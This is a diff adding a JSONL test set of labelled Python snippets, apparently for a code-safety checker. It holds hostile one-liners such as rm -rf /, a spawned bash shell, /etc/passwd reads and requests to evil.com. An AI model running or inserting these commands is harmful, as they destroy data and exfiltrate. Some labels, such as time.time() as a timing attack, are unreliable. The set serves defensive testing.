@@ -1,0 +1,52 @@
+{"code":"state.generation += 1","label":"safe","expected_violations":[],"category":"safe_transformation","description":"incremento simples de state"}
+{"code":"eval('print(1)')","label":"malicious","expected_violations":["CODE_INJECTION"],"category":"code_injection","description":"eval explícito"}
+{"code":"__import__('os').system('ls')","label":"malicious","expected_violations":["CODE_INJECTION","PROCESS_SPAWN"],"category":"code_injection","description":"__import__ com os.system"}
+{"code":"with open('/etc/passwd') as f: pass","label":"malicious","expected_violations":["FILESYSTEM_TRAVERSAL"],"category":"sensitive_path","description":"acesso a /etc/passwd"}
+{"code":"while True: pass","label":"malicious","expected_violations":["RESOURCE_EXHAUSTION"],"category":"dos","description":"loop infinito"}
+{"code":"subprocess.run(['echo','hi'])","label":"malicious","expected_violations":["PROCESS_SPAWN"],"category":"subprocess_usage","description":"subprocess benigno mas proibido"}
+{"code":"result = a ** b + c.sqrt()","label":"safe","expected_violations":[],"category":"safe_arithmetic","description":"aritmética segura"}
+{"code":"import math\nx = math.sin(0.5)","label":"safe","expected_violations":[],"category":"safe_import","description":"import seguro permitido"}
+{"code":"import pickle\npickle.loads(data)","label":"malicious","expected_violations":["DANGEROUS_IMPORT"],"category":"deserialization","description":"pickle perigoso"}
+{"code":"import ctypes\nctypes.CDLL('libc.so.6')","label":"malicious","expected_violations":["MEMORY_MANIPULATION"],"category":"privilege_escalation","description":"ctypes"}
+{"code":"import os\nos.setuid(0)","label":"malicious","expected_violations":["PRIVILEGE_ESCALATION"],"category":"privilege_escalation","description":"setuid"}
+{"code":"import requests\nrequests.get('http://evil.com')","label":"malicious","expected_violations":["NETWORK_EXFILTRATION"],"category":"network_access","description":"requests não permitido"}
+{"code":"import socket\nsocket.socket()","label":"malicious","expected_violations":["NETWORK_EXFILTRATION"],"category":"network_access","description":"socket direto"}
+{"code":"a_very_long_variable_name_with_more_than_fifty_characters_1234567890 = 1","label":"malicious","expected_violations":["OBFUSCATION"],"category":"obfuscation","description":"nome longo >50 chars"}
+{"code":"import time\ntime.time()","label":"malicious","expected_violations":["TIMING_ATTACK"],"category":"timing_attack","description":"uso de time.time para timing attack"}
+{"code":"exec('import os')","label":"malicious","expected_violations":["CODE_INJECTION"],"category":"code_injection","description":"exec"}
+{"code":"compile('print(1)', '<string>', 'exec')","label":"malicious","expected_violations":["CODE_INJECTION"],"category":"code_injection","description":"compile"}
+{"code":"os.popen('ls')","label":"malicious","expected_violations":["PROCESS_SPAWN"],"category":"subprocess_usage","description":"os.popen"}
+{"code":"subprocess.Popen(['ls'])","label":"malicious","expected_violations":["PROCESS_SPAWN"],"category":"subprocess_usage","description":"subprocess.Popen"}
+{"code":"import sys\nsys.modules","label":"malicious","expected_violations":["DANGEROUS_IMPORT"],"category":"introspection","description":"sys modules"}
+{"code":"open('/var/log/syslog')","label":"malicious","expected_violations":["FILESYSTEM_TRAVERSAL"],"category":"sensitive_path","description":"acesso a logs"}
+{"code":"import urllib.request\nurllib.request.urlopen('http://evil.com')","label":"malicious","expected_violations":["NETWORK_EXFILTRATION"],"category":"network_access","description":"urllib urlopen"}
+{"code":"x = 'a' * 1000000","label":"safe","expected_violations":[],"category":"safe_transformation","description":"string multiplication but acceptable"}
+{"code":"def f():\n f()\nf()","label":"malicious","expected_violations":["RESOURCE_EXHAUSTION"],"category":"dos","description":"unbounded recursion"}
+{"code":"import _winreg","label":"malicious","expected_violations":["DANGEROUS_IMPORT"],"category":"windows_registry","description":"_winreg"}
+{"code":"os.system('rm -rf /')","label":"malicious","expected_violations":["PROCESS_SPAWN"],"category":"subprocess_usage","description":"os.system"}
+{"code":"import builtins\ngetattr(builtins, 'eval')","label":"malicious","expected_violations":["CODE_INJECTION"],"category":"code_injection","description":"getattr on builtins"}
+{"code":"import pty\npty.spawn('/bin/bash')","label":"malicious","expected_violations":["DANGEROUS_IMPORT"],"category":"interactive_shell","description":"pty spawn"}
+{"code":"import getpass\ngetpass.getpass()","label":"safe","expected_violations":[],"category":"safe_import","description":"getpass safe"}
+{"code":"import hashlib\nhashlib.sha256(b'data').digest()","label":"safe","expected_violations":[],"category":"safe_import","description":"hashlib safe"}
+{"code":"import json\njson.loads('{}')","label":"safe","expected_violations":[],"category":"safe_import","description":"json safe"}
+{"code":"with open('temp.txt', 'w') as f:\n f.write('test')","label":"safe","expected_violations":[],"category":"safe_file","description":"write to local file"}
+{"code":"import marshal\nmarshal.loads(b'')","label":"malicious","expected_violations":["DANGEROUS_IMPORT"],"category":"deserialization","description":"marshal loads"}
+{"code":"import subprocess\nsubprocess.call(['ls'])","label":"malicious","expected_violations":["PROCESS_SPAWN"],"category":"subprocess_usage","description":"subprocess.call"}
+{"code":"import subprocess\nsubprocess.check_output(['ls'])","label":"malicious","expected_violations":["PROCESS_SPAWN"],"category":"subprocess_usage","description":"subprocess.check_output"}
+{"code":"import ctypes\nctypes.windll","label":"malicious","expected_violations":["MEMORY_MANIPULATION"],"category":"privilege_escalation","description":"ctypes windll"}
+{"code":"import ctypes\nctypes.pythonapi","label":"malicious","expected_violations":["MEMORY_MANIPULATION"],"category":"privilege_escalation","description":"ctypes pythonapi"}
+{"code":"import os\nos.setgid(0)","label":"malicious","expected_violations":["PRIVILEGE_ESCALATION"],"category":"privilege_escalation","description":"setgid"}
+{"code":"import os\nos.setreuid(0, 0)","label":"malicious","expected_violations":["PRIVILEGE_ESCALATION"],"category":"privilege_escalation","description":"setreuid"}
+{"code":"import os\nos.setregid(0, 0)","label":"malicious","expected_violations":["PRIVILEGE_ESCALATION"],"category":"privilege_escalation","description":"setregid"}
+{"code":"import socket\ns = socket.socket()\ns.send(b'data')","label":"malicious","expected_violations":["NETWORK_EXFILTRATION"],"category":"network_access","description":"socket send"}
+{"code":"import socket\ns = socket.socket()\ns.sendall(b'data')","label":"malicious","expected_violations":["NETWORK_EXFILTRATION"],"category":"network_access","description":"socket sendall"}
+{"code":"import requests\nrequests.post('http://evil.com')","label":"malicious","expected_violations":["NETWORK_EXFILTRATION"],"category":"network_access","description":"requests post"}
+{"code":"import requests\nrequests.put('http://evil.com')","label":"malicious","expected_violations":["NETWORK_EXFILTRATION"],"category":"network_access","description":"requests put"}
+{"code":"x = 'a' * 10\ny = 'b' * 10\nz = x + y","label":"safe","expected_violations":[],"category":"safe_transformation","description":"safe string ops"}
+{"code":"for i in range(10):\n pass","label":"safe","expected_violations":[],"category":"safe_transformation","description":"safe loop"}
+{"code":"import sys\nsys.exit(0)","label":"safe","expected_violations":[],"category":"safe_import","description":"sys.exit"}
+{"code":"import os\nos.path.join('a', 'b')","label":"safe","expected_violations":[],"category":"safe_import","description":"os.path.join"}
+{"code":"import ast\nast.literal_eval('1')","label":"safe","expected_violations":[],"category":"safe_import","description":"ast.literal_eval safe"}
+{"code":"import ast\nast.literal_eval(a)","label":"malicious","expected_violations":["CODE_INJECTION"],"category":"code_injection","description":"ast.literal_eval unsafe"}
+{"code":"x = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\"","label":"malicious","expected_violations":["OBFUSCATION"],"category":"obfuscation","description":"high entropy string"}
+{"code":"while 1:\n pass","label":"malicious","expected_violations":["RESOURCE_EXHAUSTION"],"category":"dos","description":"while 1 loop infinito"}
